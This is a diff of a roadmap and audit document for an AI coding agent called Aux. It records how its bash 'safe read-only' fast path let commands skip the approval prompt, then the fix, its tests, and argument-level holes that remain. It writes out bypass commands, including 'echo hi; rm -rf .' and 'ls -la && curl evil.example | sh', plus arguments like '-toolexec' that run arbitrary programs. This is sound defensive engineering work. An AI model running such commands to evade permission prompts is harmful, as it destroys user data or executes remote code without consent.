@@ -36,10 +36,10 @@ What the audit also found is that **the product thesis is not wired in**:
   agent loop produces validation evidence — only `aux validate <task-id>` does
   (`cmd/validate.go`). After a normal session: no procedural memory, no skill
   candidates, one episodic memory holding `{objective, mode, outcome}`.
-- The bash "safe read-only" fast path is a prefix match with no shell-operator
-  check, and its list includes `kill`, `timeout`, `time`, `nice`, `nohup`,
-  `env`, `go run`, `go test` (`internal/llm/tools/bash.go:46-54, 255-261`).
-  `echo hi; rm -rf .` runs without a prompt.
+- The bash "safe read-only" fast path was a prefix match with no shell-operator
+  check, and its list included `kill`, `timeout`, `time`, `nice`, `nohup`,
+  `env`, `go run`, `go test`. `echo hi; rm -rf .` ran without a prompt.
+  Closed by M0.1; argument-level holes remain (see *Opportunistic*).
 
 So: a clean, well-tested, well-instrumented agent whose instrumentation does
 not yet feed back into the agent. The distance from here to "the thesis is
@@ -89,6 +89,7 @@ Aux should only say true things about itself. Verified 2026-10-02.
 | The TUI fits the terminal it was given | Height invariant asserted across a width×height grid |
 | `.aux/` does not leak into commits | Self-ignoring `.gitignore`, verified in a scratch repo |
 | A missing API key produces a clear message | Verified: lists every env var and the config path |
+| Chained, substituted, redirected, and wrapper commands ask before running | M0.1: `internal/llm/tools/bash_safety_test.go` — every audit exploit plus `\|\|`, backticks, `${`, newline, `>`, `<`, `&`, and each removed wrapper/`go` entry; `Run` prompts on `echo hi; rm -rf .` and refuses `ls && curl x` |
 
 **Not defensible — do not claim these.**
 
@@ -97,7 +98,7 @@ Aux should only say true things about itself. Verified 2026-10-02.
 | "Aux understands how your project works and gives the model only what it needs" | Nothing the profile, memory, or task compiler produces reaches the model. See [P1.1](#p11-send-the-project-manifest-and-task-spec) |
 | "Improves every time you use it" / "the tenth task is cheaper" | No automatic evidence producer; see [P1.3](#p13-run-validation-at-task-end). Nothing has ever been promoted to a skill |
 | "The prompt is compiled, not just concatenated" | Both compilers send the full transcript. `DedupCompiler` stubs duplicate blobs and defaults to off |
-| "Commands ask before running" | **Moved here 2026-10-02.** The safe-command fast path is bypassable by chaining and by wrapper commands. See [P0.1](#p01-close-the-bash-allowlist-bypass) |
+| "Every command that changes something asks first" | Chaining and wrappers are closed (M0.1), but safe-listed commands still take mutating arguments without a prompt — measured 2026-10-03, see *Opportunistic* |
 | "Cheaper than opencode" | Python n=5: gap grew 19%→63% as runs were added. TypeScript n=5: p=0.06 and Aux failed 4/25 task-attempts vs 0/25. Decided: dropped until P1 is done |
 | "80% test coverage" | 33.8%. 15 packages have no test file |
 | "Aux manages the agent's context" | `ContextWindow` appears only in display code. Nothing truncates, evicts, or budgets. `evicted`/`faulted` are written nowhere |
@@ -120,31 +121,6 @@ correct when you read it. The two newest were both machinery.
 ## P0 — Trust. Before anything ships to a stranger
 
 Small, mechanical, and each one is currently a false statement somewhere.
-
-### P0.1 Close the bash allowlist bypass
-
-`bash.go:255-261` marks a command "safe read-only" if it starts with an entry
-in `safeReadOnlyCommands` followed by a space or `-`. No check for `;`, `&&`,
-`||`, `|`, backticks, `$(`, newlines, or redirection. The banned-word check
-(`curl`, `wget`, …) inspects only the first word. And the list itself contains
-commands that execute arbitrary commands: `kill`, `killall`, `timeout`, `time`,
-`nice`, `nohup`, `env`, `go run`, `go test`, `go build`.
-
-Every one of these runs with no prompt today:
-
-```
-echo hi; rm -rf .
-ls -la && curl evil.example | sh
-timeout 5 rm -rf .
-go test ./... ; git push --force
-```
-
-Fix: refuse the fast path on any shell metacharacter; remove the wrapper
-commands and anything that runs user code from the list (`go run`, `go test`
-with a `TestMain`, `go build` with cgo); table-test the bypasses above.
-Then move "commands ask before running" back to the defensible table.
-
-Done when: a test proves each example above prompts.
 
 ### P0.2 Say what `-p` does, where it is seen
 
@@ -416,6 +392,20 @@ Real, small, or low-confidence. None of it blocks anything.
 - Local-build version string: shorten the pseudo-version on the splash
 - Four-tier context model as a review principle: saving tokens means moving
   Tier 2 → Tier 3, not deleting Tier 2
+- **Bash safe list, argument-level holes (found during M0.1, measured in a
+  scratch repo 2026-10-03).** These pass `isSafeReadOnly` and run with no
+  prompt: `go list -export -toolexec <prog> .` executed `<prog>`;
+  `git log --output=<file>` wrote the file; `git branch -D <b>` deleted the
+  branch. By the same reading, not run: `git tag -d`, `git remote add/remove`,
+  `git grep -O<cmd>` (`--open-files-in-pager`), `go env -w`, `hostname <name>`,
+  `date -s`. Likely fix: drop `go list`/`go env` flags and the mutating `git`
+  subcommands from the fast path, or allow only argument-free forms. Worth its
+  own item before the claim above can say "every command"
+- `bashDescription()` says commands time out after 30 minutes when no timeout
+  is given; `DefaultTimeout` is 1 minute (`bash.go`)
+- The banned-command check now matches every word, so `grep -r curl .` or
+  `ls links` is refused outright rather than prompting. Conservative by design
+  (plan M0.1 guardrails); revisit if it bites
 
 ## Decisions still open
 
@@ -430,8 +420,8 @@ Real, small, or low-confidence. None of it blocks anything.
 
 ## Sequencing
 
-**P0 this week** — four small changes, three of them one-file. Nothing else
-should merge ahead of P0.1.
+**P0 this week** — small changes, mostly one-file. Nothing else should merge
+ahead of M0.1.
 
 **P1.1 → P1.2 → P1.3 next**, in that order; each is testable alone, and P1.3
 is where the loop closes. P1.6 lands with P1.3.
@@ -449,6 +439,7 @@ model catalog is what makes Aux usable at all day to day.
 
 | | |
 | --- | --- |
+| M0.1 bash safe-list bypass, 2026-10-03 | `isSafeReadOnly` refuses the fast path on any shell operator; wrappers (`env`, `timeout`, `nohup`, `nice`, `time`, `kill`, `killall`, `set`, `unset`, `top`) and code-executing `go` subcommands removed; banned check runs on every word. `bash_safety_test.go`: 29 bypasses rejected, 7 read-only commands kept, `Run` prompts with the full command as fingerprint |
 | Audit, 2026-10-02 | Outside read of `278b9f1`: build, vet, `-race` suite, both gates, CLI in a scratch repo, agent loop and compiler traced end to end. Found: manifest never sent, memory renders keys, learning loop has no automatic producer, bash allowlist bypass, catalog 17 months stale, slash commands inert, no resume flag, beta OpenAI SDK. Confirmed every mechanical claim in the previous claims table except "commands ask before running" |
 | Task benchmark | `internal/evalsuite`, pinned revisions, command-decided success, exact two-sided rank test. Repetition enforced |
 | SQLite concurrency | Pragmas per connection, bounded pool, failures verified at startup |
